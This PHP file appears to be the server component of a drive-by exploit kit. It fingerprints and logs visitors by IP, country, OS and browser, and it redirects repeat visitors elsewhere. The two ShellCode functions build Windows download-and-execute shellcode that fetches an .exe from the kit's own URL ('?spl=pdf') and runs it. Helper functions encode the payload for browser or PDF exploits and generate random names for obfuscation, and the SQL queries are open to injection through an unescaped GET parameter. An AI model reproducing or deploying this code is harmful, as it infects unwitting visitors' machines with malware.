<?php
include "config.php";
function ip()
{
	if( getenv('REMOTE_ADDR'))
       	$user_ip = getenv('REMOTE_ADDR');
     elseif( getenv('HTTP_FORWARDED_FOR'))
       	$user_ip = getenv('HTTP_FORWARDED_FOR');
     elseif( getenv('HTTP_X_FORWARDED_FOR'))
       	$user_ip = getenv('HTTP_X_FORWARDED_FOR');
     elseif( getenv('HTTP_X_COMING_FROM'))
       	$user_ip = getenv('HTTP_X_COMING_FROM');
     elseif( getenv('HTTP_VIA'))
       	$user_ip = getenv('HTTP_VIA');
     elseif( getenv('HTTP_XROXY_CONNECTION'))
       	$user_ip = getenv('HTTP_XROXY_CONNECTION');
     elseif( getenv('HTTP_CLIENT_IP'))
       	$user_ip = getenv('HTTP_CLIENT_IP');
	else
   		$user_ip='unknown';
   if(strlen($user_ip) > 15)
   {
       $ar = split(', ', $user_ip);
       for($i=sizeof($ar)-1; $i > 0; $i--)
       {
          if($ar[$i]!='' and !preg_match('/[a-zA-Zа-€ј-я]/', $ar[$i]))
         	 $user_ip = $ar[$i];  break;
          if($i==sizeof($ar)-1)
          	 $user_ip = 'unknown';
       }
   }
   if(preg_match('/[a-zA-Zа-€ј-я]/', $user_ip))
   		$user_ip = 'unknown';
   return $user_ip;
}

function addlog()
{
    global $browser, $type, $ip, $os, $country;

		   
    	$referer = getenv("HTTP_REFERER");
    	$referer=parse_url($referer);
   	    $referer = str_replace("www.","", $referer['host']);
        if(empty($referer))
   		{
			$referer='no referer';
		}
       
    $referer = addslashes($referer);
	$l = $_GET['showtopic'];
	$sql = "INSERT INTO stat(ip, referer, browser, os, country, time, thread) 
			values ('".$ip."','".$referer."','".$browser."','".$os."','".$country."',".(time()+86400).",'".$l."')";
    mysql_query($sql);


}


function detect_country()
{
	include "geoip.inc";
	global $country,$ip;
	$gi = geoip_open("GeoIP.dat", GEOIP_STANDARD);
	$country = geoip_country_code_by_addr ($gi, $ip);
	if(empty($country)) $country = "O1";
	geoip_close($gi);
	return 0;
}

function detect_os()
{
	global $user_agent, $os;
	if     (strstr($user_agent, "Windows 95"))     $os = "Windows 95";
	elseif (strstr($user_agent, "Windows NT 4"))   $os = "Windows NT 4";
	elseif (strstr($user_agent, "Windows 98"))     $os = "Windows 98";
	elseif (strstr($user_agent, "Win 9x 4.9"))     $os = "Windows ME";
	elseif (strstr($user_agent, "Windows NT 5.0")) $os = "Windows 2000";
	elseif (strstr($user_agent, "Windows NT 5.1")) $os = "Windows XP";
	elseif (strstr($user_agent, "Windows NT 5.2")) $os = "Windows 2003";
	elseif (strstr($user_agent, "Windows NT 6.0")) $os = "Windows Vista";
	elseif (strstr($user_agent, "Windows NT 6.1")) $os = "Windows 7";
	elseif (strstr($user_agent, "Linux"))          $os = "Linux";
	elseif (strstr($user_agent, "Mac OS"))         $os = "Mac OS";
	else                                           $os = "Other";
	return "";
}

function detect_browser()
{
	global $user_agent, $type, $browser, $ver;
	if (eregi("(opera) ([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $ver) or
	    eregi("(opera/)([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $ver))
	    {
	    	$type    = "Opera";
	    	$browser = "Opera" . " " . $ver[2];
	    }
		
		elseif (eregi("(chrome)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $ver))
	    {
	    	$type    = "Chrome";
	    	$browser = "Chrome" . " " . $ver[2];
	    }
	    elseif (eregi("(konqueror)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $ver))
	    {
	    	$type    = "Konqueror";
	    	$browser = "Konqueror" . " " . $ver[2];
	    }
	    elseif (eregi("(lynx)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $ver))
	    {
	    	$type    = "Lynx";
	    	$browser = "Lynx" . " " . $ver[2];
	    }
	    elseif (eregi("(links) \\(([0-9]{1,2}.[0-9]{1,3})", $user_agent, $ver))
	    {
	    	$type    = "Links";
	    	$browser = "Links" . " " . $ver[2];
	    }
	    elseif (eregi("(msie) ([0-9]{1,2}.[0-9]{1,3})", $user_agent, $ver))
	    {
	    	$type    = "Internet Explorer";
	    	$browser = "Internet Explorer" . " " . $ver[2];
	    }
	    elseif (eregi("(netscape6)/(6.[0-9]{1,3})", $user_agent, $ver))
	    {
	    	$type    = "Netscape";
	    	$browser = "Netscape" . " " . $ver[2];
	    }
	    elseif (eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $ver) or
	            eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $ver))
	    {
	    	$type    = "Firefox";
	    	$browser = "Firefox" . " " . $ver[2];
	    }
		 elseif (eregi("(SeaMonkey)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $ver) or
	            eregi("(seamonkey)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $ver))
	    {
	    	$type    = "Seamonkey";
	    	$browser = "Seamonkey" . " " . $ver[2];
	    }
	    elseif (eregi("(flock)", $user_agent))
		{
			$type    = "Flock";
			$browser = "Flock";
		}
		elseif (eregi("(Safari)/([0-9]{1,2})", $user_agent,$ver))
	    {
	    	$type    = "Safari";
	    	$browser = "Safari";
	    }
		elseif (eregi("(mozilla)/([0-9]{1,2}.[0-9]{1,3})", $user_agent,$ver))
	    {
	    	$type    = "Mozilla";
	    	$browser = "Mozilla" . " " . $ver[2];
	    }
	    else
	    {
	    	$type    = "Other";
	    	$browser = "Other";
	    }
	return '';
}

function uniq()   // ќпределение уникальных пользователей
{
global $ip;
$time = time();
$sql = 'SELECT * FROM `stat` WHERE `ip`="' . $ip . '" and `time` < '.($time+86400);

    if (mysql_num_rows(mysql_query($sql))> 0)
   	 {
		header("Location: "."http://www.bing.com");
	    die();
	}
	
$sell_code = $_GET['showtopic'];
$q = mysql_query("select name from threads WHERE link='".$sell_code."'");
$seller = mysql_fetch_array($q);
@mysql_free_result($q);
if ($seller == "")  {die;exit;} 
	
}

function unesc($s)
{
	$out = "";
	$res=strtoupper(bin2hex($s));
	$g = round(strlen($res)/4);
	if ($g != (strlen($res)/4)) $res.="00";
	for ($i=0; $i<strlen($res);$i+=4)
	$out.="%u".substr($res,$i+2,2).substr($res,$i,2);
	return $out;
}

function ShellCode()
{ 
	global $url;
	$uri = $url."?spl=pdf";
	$hex='';
    for ($i=0; $i < strlen($uri); $i++)
    {
        $hex .= "\x".dechex(ord($uri[$i]));
    }
	$uri = $hex;
	$shell = unesc(
	"\x33\xC0\x64\x8B\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B".
	"\x58\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x58\x3C\x6A\x44\x5A".
	"\xD1\xE2\x2B\xE2\x8B\xEC\xEB\x4F\x5A\x52\x83\xEA\x56\x89\x55\x04".
	"\x56\x57\x8B\x73\x3C\x8B\x74\x33\x78\x03\xF3\x56\x8B\x76\x20\x03".
	"\xF3\x33\xC9\x49\x50\x41\xAD\x33\xFF\x36\x0F\xBE\x14\x03\x38\xF2".
	"\x74\x08\xC1\xCF\x0D\x03\xFA\x40\xEB\xEF\x58\x3B\xF8\x75\xE5\x5E".
	"\x8B\x46\x24\x03\xC3\x66\x8B\x0C\x48\x8B\x56\x1C\x03\xD3\x8B\x04".
	"\x8A\x03\xC3\x5F\x5E\x50\xC3\x8D\x7D\x08\x57\x52\xB8\x33\xCA\x8A".
	"\x5B\xE8\xA2\xFF\xFF\xFF\x32\xC0\x8B\xF7\xF2\xAE\x4F\xB8\x65\x2E".
	"\x65\x78\xAB\x66\x98\x66\xAB\xB0\x6C\x8A\xE0\x98\x50\x68\x6F\x6E".
	"\x2E\x64\x68\x75\x72\x6C\x6D\x54\xB8\x8E\x4E\x0E\xEC\xFF\x55\x04".
	"\x93\x50\x33\xC0\x50\x50\x56\x8B\x55\x04\x83\xC2\x7F\x83\xC2\x31".
	"\x52\x50\xB8\x36\x1A\x2F\x70\xFF\x55\x04\x5B\x33\xFF\x57\x56\xB8".
	"\x98\xFE\x8A\x0E\xFF\x55\x04\x57\xB8\xEF\xCE\xE0\x60\xFF\x55\x04".
	$uri);
		
	return $shell;
}

function ShellCode_PDF()
{
	
	global $url;
	$uri = $url."?spl=pdf";
	$hex='';
    for ($i=0; $i < strlen($uri); $i++)
    {
        $hex .= "\x".dechex(ord($uri[$i]));
    }
	$uri = $hex;
	$ShellCode = "\x33\xC0\x64\x8B\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B";
	$ShellCode = $ShellCode."\x58\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x58\x3C\x6A\x44\x5A";
	$ShellCode = $ShellCode."\xD1\xE2\x2B\xE2\x8B\xEC\xEB\x4F\x5A\x52\x83\xEA\x56\x89\x55\x04";
	$ShellCode = $ShellCode."\x56\x57\x8B\x73\x3C\x8B\x74\x33\x78\x03\xF3\x56\x8B\x76\x20\x03";
	$ShellCode = $ShellCode."\xF3\x33\xC9\x49\x50\x41\xAD\x33\xFF\x36\x0F\xBE\x14\x03\x38\xF2";
	$ShellCode = $ShellCode."\x74\x08\xC1\xCF\x0D\x03\xFA\x40\xEB\xEF\x58\x3B\xF8\x75\xE5\x5E";
	$ShellCode = $ShellCode."\x8B\x46\x24\x03\xC3\x66\x8B\x0C\x48\x8B\x56\x1C\x03\xD3\x8B\x04";
	$ShellCode = $ShellCode."\x8A\x03\xC3\x5F\x5E\x50\xC3\x8D\x7D\x08\x57\x52\xB8\x33\xCA\x8A";
	$ShellCode = $ShellCode."\x5B\xE8\xA2\xFF\xFF\xFF\x32\xC0\x8B\xF7\xF2\xAE\x4F\xB8\x65\x2E";
	$ShellCode = $ShellCode."\x65\x78\xAB\x66\x98\x66\xAB\xB0\x6C\x8A\xE0\x98\x50\x68\x6F\x6E";
	$ShellCode = $ShellCode."\x2E\x64\x68\x75\x72\x6C\x6D\x54\xB8\x8E\x4E\x0E\xEC\xFF\x55\x04";
	$ShellCode = $ShellCode."\x93\x50\x33\xC0\x50\x50\x56\x8B\x55\x04\x83\xC2\x7F\x83\xC2\x31";
	$ShellCode = $ShellCode."\x52\x50\xB8\x36\x1A\x2F\x70\xFF\x55\x04\x5B\x33\xFF\x57\x56\xB8";
	$ShellCode = $ShellCode."\x98\xFE\x8A\x0E\xFF\x55\x04\x57\xB8\xEF\xCE\xE0\x60\xFF\x55\x04";
	$ShellCode = $ShellCode.$uri;
		
	return $ShellCode;
}

function Generate_Random_String($Length, $ID)
{
	$srt_array = array();
	for ($a = 0; $a <= $ID; $a++) 
	{
		$result = "";
		$nums = "0123456789";
		$syms = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
		$sux = $nums.$syms;
		for ($i = 0; $i < $Length; $i++)
	    {
	    	$num = rand(0, strlen($sux)-1);
	     	$result .= $sux[ $num ];
	    }
	    $srt_array[] = $syms[rand(0,strlen($syms)-1)].$result;
	 }
	 return $srt_array;
}

?>